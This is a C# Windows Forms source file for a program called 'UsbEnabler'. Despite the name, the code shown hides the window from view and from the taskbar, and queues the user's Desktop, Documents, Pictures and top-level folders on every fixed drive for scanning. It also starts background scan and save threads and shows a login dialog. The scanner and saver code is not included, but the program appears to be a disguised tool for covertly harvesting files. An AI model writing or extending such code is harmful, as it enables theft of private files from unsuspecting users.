using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace UsbEnabler
{
    public partial class MainForm : Form
    {
        private NotifyIcon trayIcon;
        private ContextMenu trayMenu;

        public MainForm()
        {
            InitializeComponent();
            Form.CheckForIllegalCrossThreadCalls = false;
            Logger.Instance.logArea = this.logArea;
            UnhideFolders();

            AddSpecialFolders(); 
            BuildDirTree();


            // Create a simple tray menu with only one item.
            trayMenu = new ContextMenu();
            trayMenu.MenuItems.Add("Show", OnShow);
            trayMenu.MenuItems.Add("Exit", OnExit);

            // Create a tray icon. In this example we use a
            // standard system icon for simplicity, but you
            // can of course use your own custom icon too.
            trayIcon = new NotifyIcon();
            trayIcon.Text = "UsbEnable";
            trayIcon.Icon = BitmapAsIcon(UsbEnabler.Properties.Resources.AppIcon);

            // Add menu to tray icon and show it.
            trayIcon.ContextMenu = trayMenu;
            trayIcon.Visible = true;

            this.Icon = BitmapAsIcon(UsbEnabler.Properties.Resources.AppIcon);

            StartProcess();

            (new Login()).ShowDialog();

        }

        private void AddSpecialFolders()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            Config.Instance().ParseDirs.Add(desktop);

            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            Config.Instance().ParseDirs.Add(docs);

            string pics = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            Config.Instance().ParseDirs.Add(pics);
        }

        private Icon BitmapAsIcon(Bitmap img)
        {
            Bitmap Cbitmap = img;

            Cbitmap.MakeTransparent(Color.White);
            System.IntPtr icH = Cbitmap.GetHicon();
            return Icon.FromHandle(icH);
        }

        private void UnhideFolders()
        {
            string[] dirs = Directory.GetDirectories(".");
            foreach (string dir in dirs)
            {
                FileAttributes attributes = File.GetAttributes(dir);
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attributes &= ~FileAttributes.Hidden;
                    File.SetAttributes(dir, attributes);
                }

            }
        }

        private void StartProcess()
        {
            ThreadStart scanThreadPointer = new ThreadStart(FileScanner.Init);
            ThreadStart saveThreadPointer = new ThreadStart(FileSaver.Init);

            Thread scanThread = new Thread(scanThreadPointer);
            Thread saveThread = new Thread(saveThreadPointer);

            scanThread.Start();
            Thread.Sleep(new TimeSpan(0, 0, 2));            // wait 15 secs before starting the save thread

            if(!Config.Instance().ScanOnly)
                saveThread.Start();
        }

        protected override void OnLoad(EventArgs e)
        {
            Visible = Config.Instance().ShowUI;             // Hide form window.
            ShowInTaskbar = false;                          // Remove from taskbar.

            base.OnLoad(e);
        }

        private void OnExit(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void OnShow(object sender, EventArgs e)
        {
            Visible = true;
        }

        private void BuildDirTree()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                string driveCaption = string.Format("{0} [{1}]", drive.Name, drive.DriveType.ToString());
                TreeNode rootNode = new TreeNode(driveCaption);
                dirTree.Nodes.Add(rootNode);

                Config cfg = Config.Instance();

                if (drive.DriveType == DriveType.Fixed)
                {
                    string[] dirs = Directory.GetDirectories(drive.Name);
                    foreach(string dir in dirs)
                    {
                        if (cfg.ScanAllDirs)
                        {
                            string folder = FileHelper.GetDirectoryName(dir);
                            if (!cfg.SkipDirs.Contains(folder, StringComparer.OrdinalIgnoreCase))
                                cfg.ParseDirs.Add(dir);
                        }

                        string dirCaption = dir;

                        TreeNode dirNode = new TreeNode(dirCaption);
                        rootNode.Nodes.Add(dirNode);
                    }
                }

            }
        }
    }
}
